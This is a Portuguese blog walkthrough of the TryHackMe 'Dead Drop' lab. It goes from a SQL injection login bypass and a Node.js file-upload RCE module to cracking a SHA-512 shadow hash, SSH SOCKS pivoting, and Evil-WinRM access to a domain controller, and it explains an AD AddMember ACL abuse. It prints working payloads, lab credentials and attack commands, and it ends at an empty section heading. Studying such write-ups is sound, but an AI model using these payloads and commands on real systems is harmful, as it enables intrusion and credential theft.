---
layout: post
title: "Dead Drop — SQLi, RCE em Node.js, SSH SOCKS e acesso ao Domain Controller"
description: "Walkthrough TryHackMe Dead Drop: Nmap, Gobuster, SQL Injection, upload e require() RCE, hash SHA-512, John, APK com JADX, SSH, SCP, pivoting SOCKS/ProxyChains, NetExec, LDAP, Evil-WinRM, RDP e a rota alternativa AddMember no AD."
date: 2026-11-08
categories: [walkthrough]
tags: [tryhackme, dead-drop, linux, windows, active-directory, nmap, gobuster, sql-injection, nodejs, file-upload, rce, password-cracking, john, apk, jadx, ssh, scp, pivoting, socks, proxychains, netexec, ldap, winrm, rdp, acl, addmember, domain-admin]
---

# Dead Drop — da aplicação web ao Domain Controller

A **Dead Drop** começa com um servidor Linux na DMZ e uma rede interna Windows. O objetivo é comprometer o controlador de domínio (**DC**) e ler a flag na área de trabalho do Administrator.

Meu caminho foi: **SQL Injection no login → upload de JavaScript → RCE → leitura de backup com hash → John the Ripper → SSH → proxy SOCKS → credenciais do APK → WinRM/RDP no DC**.

Há uma diferença importante em relação ao percurso pensado pela room: **quando autentiquei como `j.harris`, essa conta já aparecia em `Domain Admins`**. Portanto, cheguei ao DC e à flag sem precisar executar a mudança de associação de grupos. Ao final, explico a permissão `AddMember`, o grupo `ITSupport-Admins` e como seria o ataque de ACL planejado, sem misturá-lo ao que realmente fiz.

> **Escopo:** laboratório autorizado e descartável do TryHackMe. IPs da AttackBox mudam após reinícios. O IP interno do lab pode ser substituído por `<web>`, `<wrk>` e `<dc>` em outros cenários. Credenciais mostradas pertencem exclusivamente à room.

## Índice

1. [Topologia e fluxo](#fluxo)
2. [Reconhecimento com Nmap e Gobuster](#recon)
3. [SQL Injection no login](#sqli)
4. [Upload de JavaScript e RCE no preview](#rce)
5. [Enumeração Linux, backup e SQLite](#linux)
6. [APK Android e credenciais do domínio](#apk)
7. [John the Ripper e SSH como svc-drop](#john)
8. [Pivoting: SSH SOCKS e ProxyChains](#pivot)
9. [Enumeração do Active Directory com NetExec e LDAP](#ad)
10. [Acesso por WinRM, RDP e flag](#flag)
11. [A rota prevista pela room: AddMember e ITSupport-Admins](#acl)
12. [Erros, tentativas e troubleshooting](#erros)
13. [Ferramentas e sintaxe para consulta](#ferramentas)
14. [Técnicas, mitigação e referências](#referencias)

<a id="fluxo"></a>

## 1. Infraestrutura e cadeia de exploração

| Máquina | Endereço no lab | Papel |
|---|---|---|
| AttackBox | `10.64.70.195` na sessão final | Máquina atacante; IP variável |
| DeadDrop-WEB | `192.168.11.200` | Aplicação web Linux na DMZ |
| DeadDrop-WRK | `192.168.11.51` | Workstation Windows, sem acesso obtido |
| DeadDrop-DC | `192.168.11.100` | Controlador do domínio `deaddrop.loc` |

~~~text
AttackBox
   |
   | Nmap + Gobuster
   v
DeadDrop-WEB:22/SSH, 80/HTTP (Express)
   |
   +--> POST /login: SQL Injection
   |            |
   |         dashboard admin
   |            |
   |         upload .js + /preview/.js
   |            |
   |         RCE como node (UID 996)
   |            |
   |       /opt/app/backup/shadow.bak
   |            |
   |       John → senha de svc-drop
   |            |
   |         SSH Linux (UID 1001)
   |            |
   |       ssh -D 1080 → SOCKS5 local
   |            |
   |       ProxyChains + NetExec/LDAP
   |            |
   |           DC: 192.168.11.100
   |
   +--> deaddrop-mobile.apk
                |
           JADX / Config.java
                |
       j.harris + senha do domínio
                |
        SMB → WinRM → Evil-WinRM
                |
         Domain Admin já presente
                |
       C:\Users\Administrator\Desktop\flag.txt

Rota alternativa prevista:
j.harris --AddMember/AddSelf--> ITSupport-Admins
                                      |
                               membro de Domain Admins
~~~

**O que observar:** a primeira vulnerabilidade não precisava dar root. Bastava criar um ponto de leitura do sistema, descobrir uma credencial real e reutilizar o acesso SSH para alcançar a rede interna.

<a id="recon"></a>

## 2. Reconhecimento — Nmap e Gobuster

### 2.1 Serviços expostos

Comecei pelo servidor web, único host de entrada conhecido:

**Comando usado:**

~~~bash
TARGET=192.168.11.200
nmap -sS -sC -sV "$TARGET"
~~~

Resultado relevante:

~~~text
22/tcp  open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp  open  http  Node.js Express
http-title: DeadDrop - Login
~~~

| Opção | Significado |
|---|---|
| `-sS` | TCP SYN scan; normalmente precisa de privilégios adequados |
| `-sC` | Scripts padrão do Nmap |
| `-sV` | Tenta identificar o serviço e sua versão |
| `-p` | Escolhe portas específicas; `-p-` verifica todas as TCP |
| `-Pn` | Não depende de descoberta prévia por ping |
| `-n` | Desativa resolução DNS |

Havia SSH, mas sem senha. A aplicação HTTP era a superfície que eu conseguia testar.

### 2.2 Descoberta de caminhos

**Comando usado:**

~~~bash
gobuster dir -u "http://$TARGET/" \
  -w dir.txt -x php,txt,bak,old,zip -t 10
~~~

Resultados relevantes:

| Caminho | Resposta | Interpretação |
|---|---|---|
| `/login` | `200` | Formulário acessível |
| `/Login` | `200` | Variação de maiúsculas também respondia |
| `/dashboard` | `302` para `/login` | Recurso existente, protegido por sessão |
| `/logout` | `302` | Rota de logout |
| `/` | `302` para `/login` | Redirecionamento da página inicial |

Parâmetros do Gobuster:

- `dir`: modo de enumeração de diretórios/rotas.
- `-u`: URL alvo.
- `-w`: wordlist de caminhos.
- `-x`: extensões a testar.
- `-t 10`: dez requisições concorrentes.

**Ponto importante:** `302` não significa inexistente. Ele pode indicar uma rota real que exige autenticação. E testar extensões como `.php` não transforma uma aplicação Node.js em PHP; é apenas uma forma de explorar caminhos possíveis.

<a id="sqli"></a>

## 3. SQL Injection — bypass do login

A aplicação utilizava o formulário `POST /login`, com campos `username` e `password`.

Testei credenciais comuns e aspas. Uma tentativa apenas com `admin'` retornou erro; já o payload booleano abriu o painel:

~~~text
username: admin' OR '1'='1'-- -
password: test
~~~

**Resultado observado:** `302` para `/dashboard` e painel exibindo `Logged in as admin`.

O mecanismo provável é uma consulta que concatena o valor informado pelo usuário ao SQL. Em dialetos compatíveis, o payload faz:

- `'`: tenta encerrar a string do usuário.
- `OR '1'='1'`: acrescenta uma condição verdadeira.
- `-- -`: comenta o restante da consulta, incluindo a verificação da senha, quando a sintaxe permite.

Exemplo didático de uma consulta vulnerável, **não um dump da requisição que usei**:

~~~sql
SELECT * FROM users
WHERE username = 'admin' OR '1'='1'-- -'
AND password = 'test';
~~~

A prova prática foi o redirecionamento e a criação de uma sessão válida. O cookie observado era `connect.sid`, compatível com sessão da aplicação Express; **não era necessário tratá-lo como JWT**.

**Mitigação:** prepared statements (consultas parametrizadas) e autenticação verificada no backend. Escapar aspas manualmente não substitui a parametrização.

<a id="rce"></a>

## 4. Upload + preview de JavaScript = RCE

Depois do login, encontrei um gerenciador de arquivos com as funções:

| Funcionalidade | Rota observada |
|---|---|
| Upload | `POST /upload`, campo multipart `file` |
| Preview | `GET /preview/<filename>` |
| Renomear | `POST /rename` |
| Apagar | `POST /delete` |

Poder enviar arquivos, isoladamente, **não prova execução de código**. O detalhe decisivo era o preview: arquivos `.js` geravam respostas como `Error loading module` ou objetos JSON, sugerindo que eram **carregados como módulos Node.js**, e não apresentados apenas como texto.

### 4.1 Payload que confirmou a execução

Criei `teste-rce.js`:

~~~javascript
const { execSync } = require('child_process');

module.exports = {
  teste: "RCE",
  usuario: execSync('whoami').toString().trim(),
  diretorio: process.cwd()
};
~~~

Enviei pelo upload e abri:

~~~text
http://192.168.11.200/preview/teste-rce.js
~~~

**Resposta real:**

~~~json
{
  "teste": "RCE",
  "usuario": "node",
  "diretorio": "/opt/app"
}
~~~

**Por que funcionou?**

1. `require('child_process')` disponibiliza recursos para iniciar processos do sistema.
2. `execSync('whoami')` executa o comando e espera sua saída.
3. `.toString().trim()` converte o resultado para texto e remove a quebra de linha.
4. `process.cwd()` retorna o diretório de trabalho do processo.
5. `module.exports` devolve um objeto que o preview renderizou.

O preview **executava o módulo que deveria apenas mostrar**. Essa é a falha: **Unrestricted File Upload + Unsafe Dynamic Module Loading → Remote Code Execution**.

No código carregado dinamicamente, as instruções no topo do arquivo são avaliadas pelo Node.js. Em um segundo exemplo, uma exceção proposital também fez o preview exibir o resultado de comandos, com `uid=996(node)`.

> **Atenção:** o usuário `node` é o usuário do processo web, não `root`. Uma RCE deve ser acompanhada de enumeração de identidade, diretórios e permissões antes de presumir privilégios.

### 4.2 O que não era uma vulnerabilidade confirmada

Também testei nomes de arquivos com `../` e barras codificadas no preview. A tentativa de alcançar `/etc/passwd` retornou `File not found`. Portanto, **não confirmei Path Traversal** nesse endpoint.

<a id="linux"></a>

## 5. Enumeração Linux — o backup que virou SSH

Com a RCE, consultei `id`, `ip route`, DNS, diretórios de `/opt/app` e a rede interna.

O servidor executava como:

~~~text
uid=996(node) gid=996(node) groups=996(node)
cwd: /opt/app
ens5: 192.168.11.200/24
gateway: 192.168.11.1
~~~

A aplicação possuía esta estrutura:

~~~text
/opt/app/
├── app.js
├── backup/
│   └── shadow.bak
├── db/
│   └── deaddrop.db
├── node_modules/
├── public/
├── uploads/
└── views/
~~~

### 5.1 Leitura do backup

O arquivo mais importante estava em:

~~~text
/opt/app/backup/shadow.bak
~~~

Seu conteúdo tinha uma entrada no formato `/etc/shadow`:

~~~text
svc-drop:$6$f1331af25300c7f3$7twueSf8eUyvgYnPWElPYpspGgBuYJ.TMGrPZ2OBC6pGq18ZGkkPke9S0tRlQ3EpiRLWEqhgnqkh2BOHfdCCH0:19700:0:99999:7:::
~~~

A estrutura de interesse é:

~~~text
usuario:$id_algoritmo$salt$hash:informações_de_expiração
~~~

- `svc-drop`: conta associada à entrada.
- `$6$`: **SHA-512 Crypt**, algoritmo de hash de senha do Linux.
- `salt`: valor usado para diferenciar hashes de senhas iguais.
- restante: dados do hash e metadados de validade da senha.

**Hash não é senha criptografada reversível.** A técnica é testar candidatos até um produzir o mesmo resultado.

### 5.2 SQLite: outra pista, sem confundir senhas

Também encontrei `/opt/app/db/deaddrop.db`, um banco SQLite usado pela aplicação (dependência `better-sqlite3`).

Ao inspecionar o conteúdo, apareceram registros de aplicação:

~~~text
svc-backup : BackupAgent2024
admin      : SuperSecretAdm1n!
~~~

Essas credenciais **não foram necessárias** para obter SSH ou Domain Admin. Não as considerei contas válidas do Windows só por aparecerem no banco web.

Para inspecionar um SQLite corretamente, não é ideal usar `cat`: o arquivo é binário. Com `sqlite3` disponível, o comando de leitura seria:

~~~bash
sqlite3 -readonly /opt/app/db/deaddrop.db '.tables'
sqlite3 -readonly /opt/app/db/deaddrop.db \
  'SELECT id,username,password FROM users;'
~~~

### 5.3 Buscar arquivos interessantes sem poluir a saída

Depois, já por SSH, testei:

~~~bash
find /home /opt /var/www /tmp \
  -path /opt/app/uploads -prune -o \
  -type f \( -iname '*flag*' -o -iname 'user.txt' -o -iname '*.txt' \) \
  -print 2>/dev/null | sort -u
~~~

- `-prune`: pula a pasta de uploads.
- `-type f`: somente arquivos.
- `-iname`: pesquisa o nome ignorando maiúsculas/minúsculas.
- `-print`: imprime caminhos.
- `2>/dev/null`: suprime erros de permissão.
- `sort -u`: ordena e remove repetições.

O resultado veio principalmente de arquivos de teste das dependências Node.js. **Não encontrei a flag final no servidor web**. Ela estava prevista no DC.

Também rodei verificações de SUID, capabilities e diretórios graváveis:

~~~bash
sudo -l
find / -type f -user root -perm -4000 -printf '%p\n' 2>/dev/null | grep -v '^/snap/'
find /opt /usr/local/bin /home -type f -writable -printf '%p\n' 2>/dev/null
getcap -r / 2>/dev/null
~~~

`sudo -l` negou execução como superusuário para `svc-drop`; os outros testes não revelaram um caminho de escalada Linux necessário à solução. Não foi preciso chegar a root no web server.

<a id="apk"></a>

## 6. O APK revelou credenciais do Active Directory

O painel disponibilizava `deaddrop-mobile.apk`, e o mesmo arquivo estava no home da conta Linux:

~~~text
/home/svc-drop/backup/deaddrop-mobile.apk
~~~

APK é um pacote de aplicativo Android. Pode conter código, recursos, endpoints internos e, quando mal desenvolvido, segredos embutidos.

### 6.1 Descompilação com JADX

Eu baixei o APK e rodei:

~~~bash
jadx -d apk_out deaddrop-mobile.apk
~~~

Mesmo com alguns erros de descompilação, os arquivos relevantes foram recuperados. Procurei referências de configuração:

~~~bash
grep -RniE 'http|password|token|secret|username|api' \
  apk_out/sources/com/deaddrop/
~~~

Encontrei `Config.java` com:

~~~java
public static final String API_ENDPOINT =
    "http://internal.tryhackme.loc/api/v1";

public static final String DEFAULT_USERNAME = "j.harris";
public static final String DEFAULT_PASSWORD = "DropsOfJupiter2026!";
~~~

**Credenciais extraídas:** `j.harris / DropsOfJupiter2026!`.

O endereço `internal.tryhackme.loc` não resolvia pelo DNS do servidor web nos testes, mas as credenciais continuavam sendo uma pista válida. **Não confundir o nome de uma API com o domínio AD**, que descobrimos depois ser `deaddrop.loc`.

### 6.2 Copiando arquivos com SCP

Depois de obter SSH, confirmei a transferência do APK diretamente:

~~~bash
scp svc-drop@192.168.11.200:/home/svc-drop/backup/deaddrop-mobile.apk .
~~~

- `scp` usa SSH para copiar arquivos.
- `usuario@host:/caminho` é a origem remota.
- `.` significa salvar no diretório atual.

O SCP funcionou pela porta 22. Anteriormente, eu havia tentado servir o APK com Python HTTP na porta 9900, mas essa conexão ficou em timeout; **não é preciso abrir uma porta extra quando o SSH/SCP já funciona**.

**Mitigação:** não armazenar senhas de domínio em APKs. O usuário pode extrair o pacote e examinar as strings; ofuscação não substitui uma arquitetura sem segredo embutido.

<a id="john"></a>

## 7. John the Ripper → senha → SSH

De posse da entrada de `shadow.bak`, salvei o hash na AttackBox em `hash.txt`.

**Comando usado:**

~~~bash
john --format=sha512crypt --wordlist=rockyou.txt hash.txt
~~~

Resultado registrado:

~~~text
Loaded 1 password hash (sha512crypt, crypt(3) $6$ ...)
dropsofjupiter   (svc-drop)
1g ... DONE
Session completed
~~~

A execução levou aproximadamente dez minutos na AttackBox.

| Opção | Significado |
|---|---|
| `--format=sha512crypt` | Informa o tipo de hash do Linux |
| `--wordlist=rockyou.txt` | Arquivo de senhas candidatas |
| `hash.txt` | Arquivo de entrada com a linha do hash |
| `john --show hash.txt` | Exibe recuperações já registradas; pode incluir `--format` |

A senha encontrada foi **`dropsofjupiter`**.

**Comando usado para validar:**

~~~bash
ssh svc-drop@192.168.11.200
~~~

A autenticação funcionou:

~~~text
uid=1001(svc-drop) gid=1001(svc-drop) groups=1001(svc-drop)
HOME=/home/svc-drop
Ubuntu 24.04.1 LTS
~~~

Saí de uma RCE limitada no processo web para um **shell SSH interativo** de um usuário real. Isso não me deu root; deu algo muito importante para o próximo passo: **um canal SSH com port forwarding**.

### 7.1 E o comando unshadow?

É comum ver:

~~~bash
unshadow passwd.txt shadow.txt > unshadowed.txt
john --format=sha512crypt --wordlist=rockyou.txt unshadowed.txt
~~~

`unshadow` combina registros de `/etc/passwd` e `/etc/shadow` para gerar uma entrada adequada ao John. O `>` grava o resultado em `unshadowed.txt`.

**Aqui eu não precisei de `unshadow`:** a linha do `shadow.bak` já era aceita diretamente pelo John.

<a id="pivot"></a>

## 8. Pivoting — o SSH resolveu o que o Chisel não resolveu

O DC estava na rede interna `192.168.11.0/24`. Precisávamos usar o DeadDrop-WEB como ponto intermediário para executar ferramentas da AttackBox contra o AD.

### 8.1 O que é pivoting?

~~~text
AttackBox
127.0.0.1:1080 (SOCKS5)
       |
       | conexão SSH autenticada
       v
DeadDrop-WEB (porta 22)
192.168.11.200
       |
       | conexões TCP para rede interna
       +----> DeadDrop-DC 192.168.11.100
       +----> DeadDrop-WRK 192.168.11.51
~~~

**SOCKS** é um protocolo de proxy: a ferramenta solicita que um intermediário estabeleça a conexão TCP até determinado host e porta. **ProxyChains não é o túnel**; ele faz programas utilizarem o SOCKS disponível.

### 8.2 Tentativas antes do SSH

Antes de recuperar a senha, tentei **Chisel reverso**. Subi um servidor Chisel na AttackBox e um HTTP simples para transferir o binário, mas o JavaScript no web server falhou ao conectar de volta:

~~~text
curl: (28) Failed to connect ... port 9001: Timeout was reached
~~~

O `tcpdump` na AttackBox não mostrou a tentativa chegando. Testei também um payload de reverse shell na porta 443, sem sessão recebida, e preparei um bind shell, mas não confirmei conexão por ele.

Essas tentativas ensinam a distinguir:

| Estratégia | Sentido da conexão inicial | Resultado |
|---|---|---|
| Chisel reverse | WEB → AttackBox | Timeout |
| Reverse shell | WEB → AttackBox | Não confirmado |
| Bind shell | AttackBox → WEB em porta nova | Preparado, não confirmado |
| **SSH dinâmico** | **AttackBox → WEB:22** | **Funcionou** |

Como a porta 22 já estava acessível e a senha do `svc-drop` foi recuperada, não havia motivo para insistir em abrir portas alternativas.

### 8.3 Criando o proxy SOCKS pelo SSH

**Comando usado na AttackBox:**

~~~bash
ssh -N -D 127.0.0.1:1080 svc-drop@192.168.11.200
~~~

- `-N`: não executa comandos remotos.
- `-D`: encaminhamento **dinâmico**, criando proxy SOCKS.
- `127.0.0.1:1080`: socket local que outras ferramentas usarão.

Deixei essa conexão aberta e confirmei:

~~~bash
ss -lntp | grep 1080
~~~

~~~text
LISTEN 127.0.0.1:1080 users:(("ssh",pid=...,fd=...))
~~~

Para sessões instáveis, uma versão com diagnóstico é:

~~~bash
ssh -vv -N \
  -o ExitOnForwardFailure=yes \
  -o ServerAliveInterval=30 \
  -o ServerAliveCountMax=3 \
  -D 127.0.0.1:1080 \
  svc-drop@192.168.11.200
~~~

Se a VM desconectar, o túnel também pode cair. Verificar `ss -lntp` antes de culpar o ProxyChains evita muito troubleshooting desnecessário.

### 8.4 Configurando o ProxyChains 3.1

Eu tinha um detalhe específico da AttackBox: `proxychains4` apontava para `/usr/bin/proxychains`, **versão 3.1**. Ao tentar usar `-f`, apareceu:

~~~text
/usr/local/bin/proxychains4: 9: exec: -f: not found
~~~

Essa versão era um script que tentava executar `-f` como programa. Por isso usei o arquivo padrão `/etc/proxychains.conf`:

~~~ini
strict_chain
proxy_dns

[ProxyList]
socks5 127.0.0.1 1080
~~~

E executei **sem `-f`**:

~~~bash
proxychains nxc smb 192.168.11.100
~~~

O túnel foi confirmado pelo log:

~~~text
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.11.100:445-<><>-OK
~~~

- `strict_chain`: percorre os proxies na ordem configurada.
- `proxy_dns`: tenta resolver nomes pelo proxy.
- `socks5 127.0.0.1 1080`: endereço do SOCKS criado pelo SSH.

**Limitação:** ProxyChains é adequado a conexões TCP suportadas pela biblioteca de interceptação. Não transforma ping/ICMP ou UDP em tráfego SOCKS. Com Nmap usei `-sT` (TCP connect), não SYN scan.

### 8.5 Validando o alcance do DC e da workstation

**Comandos usados:**

~~~bash
proxychains nmap -sT -Pn -n \
  -p 135,139,445,3389,5985 192.168.11.100

proxychains nmap -sT -Pn -n \
  -p 135,139,445,3389,5985 192.168.11.51
~~~

No DC, todas essas portas responderam `open`. Na workstation `.51`, o ProxyChains registrou timeout e o Nmap mostrou `closed` nas portas testadas. Isso **não comprova** que a máquina estivesse desligada; indica que aquelas conexões não se estabeleceram nas condições do teste.

| Porta | Serviço | Uso |
|---|---|---|
| `135` | MSRPC | Comunicação RPC do Windows |
| `139/445` | NetBIOS / SMB | Compartilhamentos e autenticação |
| `3389` | RDP | Desktop remoto |
| `5985` | WinRM HTTP | PowerShell remoto |
| `389` | LDAP | Consulta ao diretório AD |
| `88` | Kerberos | Autenticação no domínio |

<a id="ad"></a>

## 9. NetExec e LDAP — descobrindo o domínio e validando credenciais

### 9.1 Identificação do controlador de domínio

**Comando usado:**

~~~bash
proxychains nxc smb 192.168.11.100
~~~

Resultado relevante:

~~~text
SMB 192.168.11.100 445 DEADDROP-DC
Windows 10 / Server 2019 Build 17763 x64
domain: deaddrop.loc
signing: True
SMBv1: False
Null Auth: True
DC: True
~~~

- `signing: True`: assinatura SMB habilitada/obrigatória conforme detecção do NetExec; é uma propriedade relevante para ataques de relay.
- `SMBv1: False`: protocolo legado não disponível.
- `Null Auth: True`: o teste do NetExec identificou algum comportamento de autenticação nula; não significa que todos os compartilhamentos ou objetos AD sejam legíveis anonimamente.
- `DC: True`: o host atua como controlador de domínio.

O domínio **não era `internal.tryhackme.loc`**, string da API no APK. O domínio AD era **`deaddrop.loc`**.

### 9.2 Autenticação SMB com a credencial do APK

**Comando usado:**

~~~bash
proxychains nxc smb 192.168.11.100 \
  -u 'j.harris' \
  -p 'DropsOfJupiter2026!' \
  -d 'deaddrop.loc'
~~~

Resultado:

~~~text
[+] deaddrop.loc\j.harris:DropsOfJupiter2026! (Pwn3d!)
~~~

| Parâmetro | O que faz |
|---|---|
| `smb` | Protocolo do NetExec |
| `-u` | Usuário |
| `-p` | Senha |
| `-d` | Domínio AD |
| `Pwn3d!` | Indicador de acesso administrativo reconhecido pelo NetExec nesse alvo |

**Confirmação importante:** a credencial veio do APK, não do backup `shadow.bak`. O backup abriu a porta para o SSH e para o pivot; o APK forneceu a identidade do domínio.

### 9.3 LDAP RootDSE

Consultei o LDAP no DC:

~~~bash
proxychains ldapsearch -x \
  -H ldap://192.168.11.100 -s base
~~~

Trechos úteis:

~~~text
rootDomainNamingContext: DC=deaddrop,DC=loc
defaultNamingContext: DC=deaddrop,DC=loc
dnsHostName: DEADDROP-DC.deaddrop.loc
isGlobalCatalogReady: TRUE
~~~

- `-x`: bind simples, sem SASL.
- `-H`: URL do servidor LDAP.
- `-s base`: consulta somente o objeto RootDSE.
- `-b`: base da busca, útil em enumeração de usuários e grupos.

Uma consulta mais completa a usuários, **apontando para o DC**, seria:

~~~bash
proxychains ldapsearch -x -LLL \
  -H ldap://192.168.11.100 \
  -D 'j.harris@deaddrop.loc' -W \
  -b 'DC=deaddrop,DC=loc' \
  '(&(objectCategory=person)(objectClass=user))' \
  sAMAccountName
~~~

- `-D`: identidade usada no bind.
- `-W`: solicita a senha sem colocá-la na linha de comando.
- `-LLL`: saída LDIF simplificada.
- filtro LDAP: seleciona objetos de usuário.

Um dos meus testes anteriores usou por engano `192.168.11.51` para LDAP. Como o DC era `.100`, o comando deu `Can't contact LDAP server`.

**Observação sobre DNS:** o ProxyChains tentou resolver `deaddrop.loc` através de `4.2.2.2:53` e registrou timeouts. Isso não impediu a conexão SMB por IP. Em cenários com Kerberos e SPNs, porém, resolução de nome e horário corretos podem ser essenciais.

<a id="flag"></a>

## 10. WinRM, RDP e a flag final

### 10.1 NetExec confirmou WinRM

Como a porta `5985` estava aberta:

~~~bash
proxychains nxc winrm 192.168.11.100 \
  -u 'j.harris' \
  -p 'DropsOfJupiter2026!' \
  -d 'deaddrop.loc'
~~~

Resultado:

~~~text
WINRM 192.168.11.100 5985 DEADDROP-DC
[+] deaddrop.loc\j.harris:DropsOfJupiter2026! (Pwn3d!)
~~~

### 10.2 Shell remoto com Evil-WinRM

**Comando usado:**

~~~bash
proxychains evil-winrm \
  -i 192.168.11.100 \
  -u 'j.harris' \
  -p 'DropsOfJupiter2026!'
~~~

- `-i`: IP de destino.
- `-u` e `-p`: credenciais.
- O `proxychains` envia a conexão TCP ao SOCKS, e o SSH faz a saída pelo WEB.

A sessão foi estabelecida em:

~~~text
*Evil-WinRM* PS C:\Users\j.harris\Documents>
~~~

Depois rodei:

~~~powershell
whoami /all
~~~

Os grupos de `j.harris` já incluíam:

~~~text
BUILTIN\Administrators
DEADDROP\Domain Admins
DEADDROP\ITSupport-Admins
Mandatory Label\High Mandatory Level
~~~

Esse foi um ponto inesperado: **eu já estava em Domain Admins**. A saída demonstra associação e um token elevado na sessão, mas **não mostra qual ACE de grupo deu origem à associação**.

### 10.3 Lendo a flag do Administrator

**Comando usado:**

~~~powershell
Get-Content 'C:\Users\Administrator\Desktop\flag.txt'
~~~

Resultado:

~~~text
THM{d34d_dr0p_d0m41n_pwn3d}
~~~

**Objetivo cumprido:** flag final obtida no controlador de domínio. Não foi necessário comprometer a workstation nem elevar `svc-drop` para root no Linux.

### 10.4 Acessando o desktop por RDP

Também consegui entrar no DC por RDP, tendo uma sessão gráfica Windows para executar `whoami /priv` e `net user`.

Uma forma de reproduzir o acesso sem depender de um cliente RDP que suporte SOCKS é criar um encaminhamento **local** separado pelo SSH:

~~~bash
# AttackBox, terminal 1
ssh -N -L 127.0.0.1:13389:192.168.11.100:3389 \
  svc-drop@192.168.11.200

# AttackBox, terminal 2
xfreerdp /v:127.0.0.1:13389 \
  /u:j.harris /d:deaddrop.loc \
  /cert:ignore /dynamic-resolution
~~~

A senha pode ser digitada no prompt do FreeRDP.

**Diferença entre os dois forwards:**

- `ssh -D 1080` cria um SOCKS para **múltiplos destinos TCP**.
- `ssh -L 13389:DC:3389` encaminha **uma porta local para uma porta remota específica**.

No RDP, `whoami /priv` mostrou privilégios como `SeDebugPrivilege`, `SeImpersonatePrivilege` e vários outros, alguns habilitados e outros desabilitados. **Disabled** nessa lista significa que o privilégio do token não está ativo naquele instante, não que o grupo `Domain Admins` tenha desaparecido.

Também usei:

~~~cmd
whoami /priv
net user
~~~

O `net user` listou contas do DC, incluindo `Administrator`, `j.harris`, `m.chen`, `r.patel` e `s.wright`.

<a id="acl"></a>

## 11. A rota planejada pela room — AddMember / ITSupport-Admins

**Esta seção é uma reconstrução técnica da rota pretendida, não a sequência de comandos que executei para chegar à flag.** Quando abri `whoami /all`, o usuário já estava em `Domain Admins` e `ITSupport-Admins`. Eu não adicionei membros a esses grupos.

### 11.1 O que é uma ACL no AD?

Cada objeto do Active Directory (usuário, grupo, computador, OU) tem um **Security Descriptor**. Sua **DACL** (*Discretionary Access Control List*) contém **ACEs** (*Access Control Entries*), que dizem quais identidades podem executar determinadas ações sobre o objeto.

Por exemplo, uma conta pode não ser Domain Admin, mas ter direito de **alterar os membros de um grupo privilegiado**. Esse controle pode virar um caminho indireto de escalada.

O cenário desta room envolve:

~~~text
j.harris
  |
  | ACE permite manipular associação (AddMember)
  | variante observada: Self-Membership / AddSelf
  v
ITSupport-Admins
  |
  | grupo aninhado
  v
Domain Admins
  |
  v
Privilégios administrativos no DC
~~~

A pergunta da room usa o nome de permissão **`AddMember`**. Tecnicamente, a ACE foi descrita em análises independentes como `WriteProperty` sobre a propriedade **Self-Membership**, o que permite ao usuário **adicionar a si mesmo** (representado como `AddSelf` em certos grafos do BloodHound). É importante distinguir a **permissão no objeto** da **aresta que a ferramenta exibe**.

### 11.2 Como eu teria confirmado a relação dos grupos?

Primeiro, consultaria o grupo no LDAP:

~~~bash
proxychains ldapsearch -x -LLL \
  -H ldap://192.168.11.100 \
  -D 'j.harris@deaddrop.loc' -W \
  -b 'DC=deaddrop,DC=loc' \
  '(cn=ITSupport-Admins)' \
  dn member memberOf description
~~~

O atributo `memberOf` mostra a quais grupos esse grupo pertence. O ponto decisivo seria ver `ITSupport-Admins` associado a `Domain Admins`.

Num PowerShell com módulo ActiveDirectory:

~~~powershell
Import-Module ActiveDirectory

Get-ADGroup 'ITSupport-Admins' -Properties memberOf |
  Select-Object Name,memberOf
~~~

### 11.3 Como inspecionar a DACL

Com direitos de leitura suficientes, usando o Impacket na AttackBox:

~~~bash
proxychains impacket-dacledit \
  -action read \
  -principal 'j.harris' \
  -target 'ITSupport-Admins' \
  -dc-ip 192.168.11.100 \
  'deaddrop.loc/j.harris:DropsOfJupiter2026!'
~~~

O comando exato pode variar se sua instalação usa `dacledit.py` em vez de `impacket-dacledit`.

Procuraria uma ACE relacionada a:

~~~text
Trustee: j.harris
Access mask: WriteProperty
Object type: Self-Membership
Target: ITSupport-Admins
~~~

Com o módulo ActiveDirectory, a verificação da DACL pode ser feita assim:

~~~powershell
Import-Module ActiveDirectory
$grupo = Get-ADGroup 'ITSupport-Admins'
(Get-Acl "AD:\$($grupo.DistinguishedName)").Access |
  Where-Object { $_.IdentityReference -like '*j.harris*' } |
  Format-List IdentityReference,ActiveDirectoryRights,ObjectType
~~~

**Não confundir `whoami /groups` com enumeração de ACLs.** O primeiro informa de quais grupos o token participa; a DACL informa **o que a conta pode modificar** em outros objetos.

### 11.4 Como o abuso ocorreria

Caso `j.harris` ainda não fosse membro e a ACE estivesse válida, o atacante poderia usar uma ferramenta de AD para adicionar **a própria conta** ao grupo permitido. Uma sintaxe ilustrativa de `bloodyAD` seria:

~~~bash
proxychains bloodyAD \
  --host 192.168.11.100 \
  -d deaddrop.loc \
  -u j.harris \
  -p 'DropsOfJupiter2026!' \
  add groupMember 'ITSupport-Admins' 'j.harris'
~~~

**Não executei esse comando nesta sessão.** O objetivo aqui é explicar a técnica; modificar a associação em um lab compartilhado quando o usuário já possui o privilégio não acrescentaria prova útil.

Após uma inclusão legítima no contexto do teste, seria necessário **reautenticar** para obter um novo token com as associações de grupo atualizadas. Então validaria novamente o acesso ao DC.

### 11.5 Onde entra o BloodHound?

BloodHound coleta e representa relações entre **usuários, grupos, computadores e permissões**. O arquivo `BloodHound.py.tar` encontrado no web server era **código-fonte do coletor**, não dados prontos para importar.

Com uma instalação compatível do coletor na AttackBox, seria possível gerar arquivos de dados:

~~~bash
proxychains bloodhound-python \
  -d deaddrop.loc \
  -u j.harris \
  -p 'DropsOfJupiter2026!' \
  -ns 192.168.11.100 \
  -dc DEADDROP-DC.deaddrop.loc \
  --dns-tcp -c All --zip
~~~

A sintaxe e os formatos podem variar entre **BloodHound legado** e **BloodHound Community Edition**. A importação é feita na interface apropriada usando o ZIP/JSON gerado pelo coletor, não o `.tar` do código.

No grafo, o caminho buscado seria:

~~~text
J.HARRIS@DEADDROP.LOC
       |
    AddSelf / AddMember
       |
ITSUPPORT-ADMINS@DEADDROP.LOC
       |
    MemberOf
       |
DOMAIN ADMINS@DEADDROP.LOC
~~~

> **Sobre o estado da room:** o painel tinha diversos uploads que eu não fiz, e `j.harris` já aparecia em grupos privilegiados. Isso é compatível com interferência de outras sessões, mas **não prova a causa exata**. Por isso, a cadeia real deste writeup termina no login administrativo já existente; a modificação de ACL fica como caminho alternativo explicado e referenciado.

<a id="erros"></a>

## 12. Tentativas, erros e troubleshooting

